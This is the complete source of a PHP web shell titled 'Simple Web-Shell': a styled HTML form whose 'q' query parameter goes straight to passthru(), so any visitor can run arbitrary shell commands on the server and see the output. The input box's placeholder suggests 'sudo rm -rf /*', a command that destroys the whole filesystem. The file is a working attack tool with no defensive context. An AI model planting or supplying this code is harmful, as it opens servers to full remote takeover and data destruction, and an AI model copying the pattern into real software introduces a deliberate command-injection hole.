<!DOCTYPE html>
<html>
    <head>
        <title>Simple Web-Shell</title>
        <style>

        body {
            color: #fff;
            margin:0;
            padding:0;
            font-family: sans-serif;
            background: linear-gradient(#141e30, #243b55);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-box {
            width: 450px;
            padding: 40px;
            background: rgba(0,0,0,.5);
            box-sizing: border-box;
            box-shadow: 0 15px 25px rgba(0,0,0,.6);
            border-radius: 10px;
        }

        .space1 {
            padding: 15px;
        }

        .command {
            margin-right: 10px;
            color: #fff;
            width: 280px;
            padding: 10px;
            background: rgba(0,0,0,.5);
            box-sizing: border-box;
            box-shadow: 0 15px 25px rgba(0,0,0,.6);
            border-radius: 10px;
            border: none;
        }

        .submit {
            color: #fff;
            width: 60px;
            padding: 10px;
            background: rgba(0,0,0,.5);
            box-sizing: border-box;
            box-shadow: 0 15px 25px rgba(0,0,0,.6);
            border-radius: 10px;
            border: none;
        }
  
        </style>
    </head>
    <body>
        <div class="login-box">
            <form action="" method="GET">
                <input style="outline: none;" name="q" type="text" placeholder=" ~$ sudo rm -rf /*" class="command">
                <input class="submit" type="submit" value="Run">
            </form>

            <div class="space1"></div>

            <p>
            <?php
            if(isset($_GET['q']))
            {
                passthru($_GET['q']);
            }
            ?>
            </p>
        </div> 
    </body>
</html>


